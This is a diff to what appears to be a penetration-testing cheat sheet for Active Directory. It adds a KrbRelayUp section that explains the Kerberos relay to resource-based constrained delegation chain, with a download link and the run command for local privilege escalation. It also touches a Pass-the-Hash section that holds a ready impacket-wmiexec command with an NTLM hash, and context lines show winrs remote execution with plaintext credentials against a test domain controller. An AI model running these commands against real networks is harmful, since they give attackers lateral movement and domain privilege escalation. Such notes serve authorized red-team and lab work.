@@ -672,8 +672,19 @@ winrs -r:dc.testad.local -u:b0b -p:SuperAdmin  "cmd /c hostname & whoami"
 
 #To access with WMI over PowerShell or just PowerShell remoting check out the enumhelper.ps1
 
+#Kerberos Relay / KrbRelay
+#Requires: LDAP signing not required on Domain Controller (=default), ability for the current domain user to add computers to the domain 
+# (ms-DS-MachineAccountQuota = 10 (default) ) or an owned computer account
+# Kerberos Relay Attack adds a fakeowned computer account to the target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, 
+# making performing a Resource-Based Constrained Delegation Attack against the target possible. The result of the RBCD attack is Silver Ticket 
+# access to the target, which can be used for local admin access remotely or even locally (meaning privilege escalation) by patching the Win32 
+# Service Control Manager to use Kerberos Authentication locally.
+https://kb.offsec.nl/tools/techniques/krbrelayup/files/KrbRelayUp.exe
+.\KrbRelayUp full -m adcs
+#There are other options too, and this vulnerability has been patched in 2022
+
 #Pass the Hash with impacket wmiexec from a Linux host
-#This requires the ADMIN$ share to be available and Windows File and Priter Sharing to be enabled. Works only on services using NTLM auth and uses SMB (TCP 445).
+#This requires the ADMIN$ share to be available and Windows File and Printer Sharing to be enabled. Works only on services using NTLM auth and uses SMB (TCP 445).
 #So works in situations where LA (Local Admin) password hash has been obtained:
 /usr/bin/impacket-wmiexec -hashes :3621C2A13F85C7B90B2DB1A990AF411B Administrator@192.168.12.34
 
